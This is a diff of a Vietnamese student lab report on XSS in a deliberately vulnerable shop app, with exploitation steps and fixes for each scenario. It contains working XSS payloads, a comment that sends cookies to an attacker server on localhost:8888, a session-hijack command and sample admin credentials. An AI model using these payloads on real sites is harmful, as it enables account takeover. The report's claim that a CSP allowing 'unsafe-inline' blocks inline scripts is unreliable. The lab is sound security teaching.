@@ -55,13 +55,14 @@ JavaScript có toàn quyền sửa đổi cấu trúc Document Object Model tron
 
 ### 2.2.1. Kiến trúc phân hệ Giao diện người dùng (Frontend Architecture)
 Phân hệ giao diện của ứng dụng TMĐT VulnShop được thiết kế bởi **Thành viên 2**, tập trung vào tính trực quan, hiện đại, tối ưu hóa trải nghiệm người dùng theo đúng tiêu chuẩn một sàn bán lẻ công nghệ trực tuyến:
-- **Ngôn ngữ & Công nghệ:** HTML5 ngữ nghĩa (Semantic HTML), CSS3 Responsive (Flexbox, CSS Grid), và Vanilla JavaScript tương tác hướng sự kiện.
+- **Ngôn ngữ & Công nghệ:** HTML5 ngữ nghĩa (Semantic HTML), CSS3 Responsive (Flexbox, CSS Grid), và Vanilla JavaScript (ES6) tương tác hướng sự kiện. Phân hệ được tích hợp đồng bộ và toàn diện với Backend Node.js (Express framework) và hệ quản trị CSDL MySQL 8.0 do **Thành viên 1** xây dựng.
 - **Tổ chức giao diện:**
-  1. **Thanh Header & Banner Trạng Thái:** Hiển thị trực tiếp chế độ bảo mật hiện tại của hệ thống (**VULNERABLE** màu đỏ vs **SECURE** màu xanh lá), nút chuyển đổi 1-click (`/toggle-mode`), nút khôi phục CSDL (`/reset-db`), thanh tìm kiếm toàn sàn và lối tắt tới Bảng theo dõi Logs Cookie của Attacker.
-  2. **Trang Chủ & Lưới Sản Phẩm (`/`):** Hiển thị danh mục sản phẩm (Laptop, Smartphone, Thiết bị âm thanh), hình ảnh, tên sản phẩm, đơn giá định dạng chuẩn Việt Nam Đồng (qua hàm xử lý `format_vnd`), mô tả ngắn và các nút tương tác giỏ hàng.
-  3. **Trang Chi Tiết Sản Phẩm & Phân Hệ Bình Luận (`/product?id=...`):** Cung cấp thông số cấu hình chi tiết và đặc biệt là phân hệ **Gửi nhận xét & Đánh giá từ khách hàng**. Đây chính là bề mặt kiểm thử cốt lõi cho kịch bản Stored XSS.
-  4. **Trang Quản Lý Hồ Sơ Cá Nhân (`/profile`):** Cho phép người dùng cập nhật Tên hiển thị công khai (Display Name), email, số điện thoại và địa chỉ giao hàng.
-  5. **Trang Tra Cứu Đơn Hàng & Vận Đơn (`/order-track`):** Hỗ trợ khách hàng theo dõi trạng thái giao hàng thông qua mã vận đơn (như ORD101, ORD202) và bóc tách thông số qua URL Hash.
+  1. **Thanh Header & Banner Trạng Thái:** Hiển thị trực tiếp chế độ bảo mật hiện tại của hệ thống (**VULNERABLE** màu đỏ vs **SECURE** màu xanh lá) tại cổng 3000, thanh tìm kiếm toàn sàn và lối tắt tới Bảng theo dõi Logs Cookie của Attacker (cổng 8888).
+  2. **Trang Chủ & Lưới Sản Phẩm (`/index.html`):** Hiển thị danh mục sản phẩm được nạp động từ CSDL MySQL của TV1 qua endpoint `/api/products/search`, hình ảnh, tên sản phẩm, đơn giá định dạng chuẩn Việt Nam Đồng (qua hàm xử lý `formatVND`), mô tả ngắn và các nút tương tác giỏ hàng.
+  3. **Trang Chi Tiết Sản Phẩm & Phân Hệ Bình Luận (`/product_detail.html?id=...`):** Cung cấp thông số cấu hình chi tiết từ `/api/products/:id` và đặc biệt là phân hệ **Gửi nhận xét & Đánh giá từ khách hàng** kết nối với `/api/reviews`. Đây chính là bề mặt kiểm thử cốt lõi cho kịch bản Stored XSS lưu vào bảng `reviews` của MySQL.
+  4. **Trang Quản Lý Hồ Sơ Cá Nhân (`/profile.html`):** Cho phép người dùng xem thông tin tài khoản phiên làm việc từ `/api/auth/me` và cập nhật Tên hiển thị công khai (Display Name).
+  5. **Trang Tra Cứu Đơn Hàng & Vận Đơn (`/order_track.html`):** Hỗ trợ khách hàng theo dõi trạng thái giao hàng thông qua mã vận đơn (như 1, 2) từ MySQL qua `/api/orders/track` và bóc tách thông số qua URL Hash để kiểm thử DOM XSS.
+  6. **Trang Bảng Điều Khiển Quản Trị (`/admin`):** Khu vực được bảo vệ nghiêm ngặt bằng session, chỉ cho phép tài khoản Admin truy cập, đóng vai trò mục tiêu tấn công chiếm quyền trong kịch bản Session Hijacking.
 
 ### 2.2.2. Khảo sát chi tiết các điểm nhập liệu và bề mặt tấn công XSS cố ý để lại
 Để phục vụ mục đích nghiên cứu và kiểm thử thâm nhập, hệ thống VulnShop được cố ý duy trì các điểm nhập liệu thiếu an toàn tại bản Vulnerable:
@@ -84,8 +85,8 @@ Theo quy định của đề tài, mỗi kịch bản thực nghiệm bắt bu�
 ### 3.2.1. Kịch bản 1: Reflected XSS trên Thanh Tìm Kiếm Sản Phẩm
 
 #### Bước 1: Lab Setup (Thiết lập môi trường)
-- Đảm bảo ứng dụng VulnShop đang hoạt động tại cổng 5000 (`http://localhost:5000`).
-- Kiểm tra thanh banner trên cùng: Phải ở trạng thái **"⚠️ CHẾ ĐỘ LỖ HỔNG (VULNERABLE)"**. Nếu chưa, nhấp vào nút *"🔄 Chuyển sang Chế độ Lỗ hổng"*.
+- Đảm bảo ứng dụng VulnShop đang hoạt động tại cổng 3000 (`http://localhost:3000`) thông qua Docker (`docker compose up`) hoặc chạy trực tiếp bằng Node.js (`node server.js`).
+- Kiểm tra thanh banner trên cùng: Phải ở trạng thái **"⚠️ VULNERABLE MODE (Port 3000)"**.
 - Mở trình duyệt Web (Chrome hoặc Firefox), bật thanh công cụ lập trình DevTools (`F12`), chuyển sang tab *Console* và *Network*.
 
 #### Bước 2: Exploitation (Thực hiện khai thác)
@@ -95,7 +96,7 @@ Theo quy định của đề tài, mỗi kịch bản thực nghiệm bắt bu�
      <script>alert('Reflected_XSS_Active')</script>
      ```
    - Nhấp nút **Tìm** hoặc điều hướng trực tiếp bằng URL:
-     `http://localhost:5000/search?q=%3Cscript%3Ealert('Reflected_XSS_Active')%3C%2Fscript%3E`
+     `http://localhost:3000/search?q=%3Cscript%3Ealert('Reflected_XSS_Active')%3C%2Fscript%3E`
    - **Hiện tượng:** Trình duyệt ngay lập tức kích hoạt hộp thoại Alert Popup hiển thị dòng chữ *"Reflected_XSS_Active"*.
 2. **Khai thác Vector Event Handler (Bypass bộ lọc thẻ script):**
    - Kẻ tấn công sử dụng payload thẻ hình ảnh:
@@ -106,20 +107,24 @@ Theo quy định của đề tài, mỗi kịch bản thực nghiệm bắt bu�
 
 #### Bước 3: Defense & Mitigation (Giải pháp khắc phục)
 1. **Mã hóa đầu ra theo ngữ cảnh (Context-aware HTML Entity Encoding):**
-   Thay vì nối chuỗi biến `q` thô vào template HTML, mã nguồn phía server được chuẩn hóa bằng hàm `html.escape()`:
-   ```python
-   # SOURCE/webapp/app.py (Chế độ SECURE)
-   safe_q = html.escape(raw_q)
-   content = f"<h1>Kết Quả Tìm Kiếm Cho: {safe_q}</h1>"
+   Thay vì nối chuỗi biến `q` thô vào template HTML, mã nguồn Node.js Express phía server được chuẩn hóa bằng hàm encode HTML entities:
+   ```javascript
+   // SOURCE/web-app/backend/server.js (Chế độ SECURE)
+   const safeQ = q.replace(/&/g, '&amp;')
+                  .replace(/</g, '&lt;')
+                  .replace(/>/g, '&gt;')
+                  .replace(/"/g, '&quot;')
+                  .replace(/'/g, '&#x27;');
+   const content = `<h2>Kết quả tìm kiếm cho: <span>${safeQ}</span></h2>`;
    ```
 2. **Thiết lập Content Security Policy (CSP):**
-   Máy chủ gửi kèm Header HTTP chặn thực thi script inline:
+   Máy chủ Express gửi kèm Header HTTP chặn thực thi script inline:
    ```http
-   Content-Security-Policy: default-src 'self' https://images.unsplash.com; object-src 'none';
+   Content-Security-Policy: default-src 'self' https://images.unsplash.com; script-src 'self' 'unsafe-inline' https://cdn.jsdelivr.net; object-src 'none';
    ```
 
 #### Bước 4: Re-test (Kiểm tra lại)
-- Bật **"🛡️ Bật Chế độ Vá lỗi (Secure)"**.
+- Khởi chạy hệ thống ở chế độ an toàn: `MODE=secure`.
 - Gửi lại toàn bộ các payload trên.
 - **Kết quả:** Thẻ `<script>` hiển thị nguyên vẹn dưới dạng chuỗi văn bản thô `&lt;script&gt;alert('Reflected_XSS_Active')&lt;/script&gt;` trên giao diện người dùng. Không có hộp thoại popup nào xuất hiện. Tab Console ghi nhận mã nguồn hoàn toàn an toàn.
 
@@ -128,70 +133,73 @@ Theo quy định của đề tài, mỗi kịch bản thực nghiệm bắt bu�
 ### 3.2.2. Kịch bản 2: Stored XSS trong Bình Luận & Đánh Cắp Phiên Đăng Nhập Quản Trị (Session Hijacking)
 
 #### Bước 1: Lab Setup (Thiết lập môi trường)
-- Khởi chạy Web TMĐT VulnShop tại `http://localhost:5000`.
-- Khởi chạy Attacker Cookie Stealer Server tại cổng 8888 (`python SOURCE/exploits/cookie_stealer/stealer.py` hoặc sử dụng container nội bộ lab). Mở tab theo dõi tại `http://localhost:8888/`.
+- Khởi chạy Web TMĐT VulnShop tại `http://localhost:3000` (`docker compose up`).
+- Khởi chạy Attacker Cookie Stealer Server tại cổng 8888 (`python SOURCE/exploits/cookie_stealer/stealer.py` hoặc qua docker compose). Mở tab theo dõi tại `http://localhost:8888/`.
 - Chuẩn bị hai phiên trình duyệt riêng biệt:
   - **Trình duyệt A (Attacker):** Cửa sổ thông thường, đóng vai người mua hàng ẩn danh.
   - **Trình duyệt B (Victim):** Cửa sổ ẩn danh (Incognito), đăng nhập với tư cách Quản trị viên (`admin` / `Admin@123`).
 
 #### Bước 2: Exploitation (Thực hiện khai thác)
 1. **Cấy mã độc Stored XSS vào sản phẩm:**
-   - Tại Trình duyệt A, truy cập chi tiết sản phẩm 1: `http://localhost:5000/product?id=1`.
+   - Tại Trình duyệt A, truy cập chi tiết sản phẩm 1: `http://localhost:3000/product_detail.html?id=1`.
    - Tại form bình luận, nhập Tên: `Khách Hàng Bí Mật`.
    - Tại ô Nhận xét, nhập payload đánh cắp cookie:
      ```html
      Sản phẩm rất đẹp! <script>new Image().src="http://localhost:8888/log?cookie=" + encodeURIComponent(document.cookie);</script>
      ```
-   - Nhấp nút **Gửi Đánh Giá**. Payload được lưu thành công vào bảng `reviews` trong CSDL `vulnshop.db`.
+   - Nhấp nút **Gửi Đánh Giá**. Payload được gửi tới API `/api/reviews` và lưu thành công vào bảng `reviews` trong CSDL MySQL `shop_db`.
 2. **Kích hoạt mã độc trên phiên Quản trị viên:**
-   - Tại Trình duyệt B, Quản trị viên truy cập Bảng điều khiển quản trị: `http://localhost:5000/admin` để duyệt bình luận.
-   - Trình duyệt Admin render danh sách bình luận. Thẻ `<script>` âm thầm thực thi trong bối cảnh phiên của Quản trị viên.
+   - Tại Trình duyệt B, Quản trị viên đăng nhập tại `/login.html` và truy cập Bảng điều khiển quản trị: `http://localhost:3000/admin`.
+   - Trình duyệt Admin render danh sách bình luận hoặc trang sản phẩm. Thẻ `<script>` âm thầm thực thi trong bối cảnh phiên của Quản trị viên.
    - Đối tượng `Image()` ngầm gửi yêu cầu GET tới máy chủ Attacker cổng 8888 kèm theo toàn bộ `document.cookie`.
 3. **Thu thập Cookie và Đột nhập trái phép (Session Hijacking):**
-   - Tại máy chủ Attacker (cổng 8888 hoặc tab `/attacker-logs`), xuất hiện dòng log:
+   - Tại máy chủ Attacker (cổng 8888), xuất hiện dòng log:
      ```text
      [2026-11-06 21:15:32] IP: 127.0.0.1
-        - Cookie nhận được : session_id=e937d40cb972412fa281
-        - Nguồn rò rỉ (Ref) : http://localhost:5000/admin
+        - Cookie nhận được : session_id=s%3Ae937d40cb972412fa281...
+        - Nguồn rò rỉ (Ref) : http://localhost:3000/
      ```
    - Kẻ tấn công chạy kịch bản giả mạo phiên:
      ```bash
-     python SOURCE/exploits/cookie_stealer/hijack_session.py e937d40cb972412fa281
+     python SOURCE/exploits/cookie_stealer/hijack_session.py s%3Ae937d40cb972412fa281...
      ```
-   - **Kết quả:** Kẻ tấn công nhận phản hồi HTTP 200 OK, chiếm toàn quyền xem danh sách người dùng, doanh thu đơn hàng và thông tin thẻ tín dụng mà không cần biết mật khẩu Admin.
+   - **Kết quả:** Kẻ tấn công nhận phản hồi HTTP 200 OK từ `http://localhost:3000/admin`, chiếm toàn quyền xem Admin Dashboard mà không cần biết mật khẩu Admin.
 4. **Khai thác DOM Defacement phụ trợ:**
-   - Kẻ tấn công gửi bình luận chứa đoạn mã sửa DOM từ file `dom_defacement.js`. Khi mở trang sản phẩm, banner đỏ "HỆ THỐNG BỊ TẤN CÔNG" xuất hiện và toàn bộ giá iPhone bị hạ xuống 1.000 VNĐ.
+   - Kẻ tấn công gửi bình luận chứa đoạn mã sửa DOM từ file `dom_defacement.js`. Khi mở trang sản phẩm, banner đỏ "HỆ THỐNG BỊ TẤN CÔNG" xuất hiện và đơn giá các thiết bị bị hạ xuống 1.000 VNĐ.
 
 #### Bước 3: Defense & Mitigation (Giải pháp khắc phục)
-1. **Thiết lập Cờ Cookie HttpOnly & SameSite:**
-   Đây là lớp phòng vệ then chốt nhất. Tại máy chủ backend:
-   ```python
-   # SOURCE/web-app/secure/config/session/session_security.py
-   c["session_id"]["httponly"] = True   # CHẶN JAVASCRIPT TRUY CẬP COOKIE
-   c["session_id"]["samesite"] = "Lax"  # PHÒNG CHỐNG CSRF
+1. **Thiết lập Cờ Cookie HttpOnly & SameSite trong Node.js Express:**
+   Đây là lớp phòng vệ then chốt nhất. Tại máy chủ Express backend:
+   ```javascript
+   // SOURCE/web-app/secure/config/session/session_security.js
+   cookie: {
+       httpOnly: true, // CHẶN JAVASCRIPT TRUY CẬP COOKIE QUA document.cookie
+       sameSite: 'lax', // PHÒNG CHỐNG TẤN CÔNG CSRF
+       secure: process.env.NODE_ENV === 'production'
+   }
    ```
 2. **Làm sạch nội dung bằng DOMPurify & textContent:**
    Khi kết xuất bình luận, áp dụng thư viện `DOMPurify.sanitize()` và gán qua `element.textContent` thay cho `innerHTML`.
 
 #### Bước 4: Re-test (Kiểm tra lại)
-- Chuyển hệ thống sang **SECURE MODE**.
+- Chuyển hệ thống sang **SECURE MODE** (`MODE=secure`).
 - Đăng nhập lại Admin và kiểm tra qua DevTools (`F12 -> Application -> Cookies`): Cột `HttpOnly` đã có dấu tích xác nhận.
 - Gửi lại payload cướp cookie.
-- Khi Admin mở trang `/admin`, thẻ script được render dưới dạng chuỗi an toàn `&lt;script&gt;...`.
-- Kiểm tra log máy chủ Attacker: Log chỉ nhận được chuỗi `(Trống - Cờ HttpOnly đã chặn đọc document.cookie!)`.
-- Chạy lại script `hijack_session.py`: Bị từ chối quyền truy cập, hoàn toàn ngăn chặn Session Hijacking.
+- Khi Admin mở trang, thẻ script được render dưới dạng chuỗi an toàn `&lt;script&gt;...` hoặc làm sạch qua DOMPurify.
+- Kiểm tra log máy chủ Attacker: Khi cố đọc `document.cookie`, chuỗi trả về hoàn toàn rỗng.
+- Chạy lại script `hijack_session.py`: Bị từ chối quyền truy cập (403 Forbidden), hoàn toàn ngăn chặn Session Hijacking.
 
 ---
 
 ### 3.2.3. Kịch bản 3: DOM-based XSS trên Trang Tra Cứu Vận Đơn
 
 #### Bước 1: Lab Setup (Thiết lập môi trường)
-- Mở trang tra cứu đơn hàng: `http://localhost:5000/order-track`.
+- Mở trang tra cứu đơn hàng: `http://localhost:3000/order_track.html`.
 - Kiểm tra mã nguồn Client-side: Trang web có đoạn mã JavaScript đọc `window.location.hash` và gán vào `target.innerHTML`.
 
 #### Bước 2: Exploitation (Thực hiện khai thác)
 - Kẻ tấn công nối payload vào sau dấu thăng `#` trên thanh địa chỉ:
-  `http://localhost:5000/order-track#<img src=x onerror=alert('DOM_XSS_Success')>`
+  `http://localhost:3000/order_track.html#<img src=x onerror=alert('DOM_XSS_Success')>`
 - Nhấn phím Enter để tải trang.
 - **Phân tích:** Trình duyệt bóc tách phần hash `rawHash.slice(1)` và gán trực tiếp vào thuộc tính `innerHTML` của phần tử `#dom-status-msg`. Sự kiện `onerror` kích hoạt ngay lập tức mà không có bất kỳ gói tin nào gửi lên server.
 
@@ -217,9 +225,9 @@ Dưới đây là bảng ma trận đối chiếu toàn diện kết quả thự
 | Tiêu chí đối chiếu | Trạng thái trước khi vá (Vulnerable Mode) | Trạng thái sau khi vá (Secure Mode) | Nhận xét chuyên môn của TV2 |
 | :--- | :--- | :--- | :--- |
 | **Điểm số CVSS v3.1** | **8.8 (High)** - Nguy cơ rò rỉ dữ liệu và chiếm quyền quản trị sàn | **0.0 (None)** - Các bề mặt tấn công đã được triệt tiêu hoàn toàn | Giảm thiểu 100% rủi ro an ninh mạng |
-| **Reflected XSS (`/search`)** | Popup Alert kích hoạt ngay khi người dùng tìm kiếm từ khóa | Ký tự `<script>` được chuyển thành `&lt;script&gt;`, hiển thị text thô | Hàm `html.escape()` và header CSP ngăn chặn thành công |
-| **Stored XSS (`/product`)** | Đoạn mã độc lưu trong CSDL, thực thi ngầm trên trình duyệt Admin | Hiển thị văn bản bình luận thuần túy, không kích hoạt thẻ script | Dùng `textContent` và `DOMPurify` loại bỏ thẻ nguy hiểm |
-| **Cướp Cookie (`document.cookie`)** | Kẻ tấn công cướp được Session ID của Admin, chiếm đoạt sàn TMĐT | Giá trị trả về rỗng, Attacker Logger chỉ nhận chuỗi rỗng | Cờ `HttpOnly=True` cô lập hoàn toàn Cookie khỏi JavaScript |
-| **DOM-based XSS (`/order-track`)** | Thực thi mã JavaScript thông qua DOM Sink `innerHTML` từ `#hash` | Hiển thị chuỗi an toàn dưới dạng TextNode qua `textContent` | Loại bỏ hoàn toàn các DOM Sink nguy hiểm phía Client |
+| **Reflected XSS (`/search`)** | Popup Alert kích hoạt ngay khi người dùng tìm kiếm từ khóa | Ký tự `<script>` được chuyển thành `&lt;script&gt;`, hiển thị text thô | Output Encoding và header CSP Express ngăn chặn thành công |
+| **Stored XSS (`/product`)** | Đoạn mã độc lưu trong MySQL `reviews`, thực thi ngầm trên trình duyệt Admin | Hiển thị văn bản bình luận thuần túy, không kích hoạt thẻ script | Dùng `textContent` và `DOMPurify` loại bỏ thẻ nguy hiểm |
+| **Cướp Cookie (`document.cookie`)** | Kẻ tấn công cướp được Session ID của Admin, chiếm đoạt sàn TMĐT | Giá trị trả về rỗng, Attacker Logger chỉ nhận chuỗi rỗng | Cờ `HttpOnly=true` trong Express Session cô lập hoàn toàn Cookie |
+| **DOM-based XSS (`/order_track.html`)** | Thực thi mã JavaScript thông qua DOM Sink `innerHTML` từ `#hash` | Hiển thị chuỗi an toàn dưới dạng TextNode qua `textContent` | Loại bỏ hoàn toàn các DOM Sink nguy hiểm phía Client |
 | **Thao túng giao diện (Defacement)** | Kẻ tấn công chèn banner đe dọa, hạ giá sản phẩm về 1.000 VNĐ | Giao diện và bảng giá sản phẩm giữ nguyên vẹn 100% | Toàn vẹn cấu trúc DOM được bảo vệ |
 | **Bảo vệ phòng thủ chiều sâu** | Không có CSP, không có cờ bảo vệ Cookie, không lọc đầu ra | Đa tầng: Output Encoding + textContent + DOMPurify + HttpOnly + CSP | Mô hình Defense-in-Depth đạt chuẩn quốc tế |
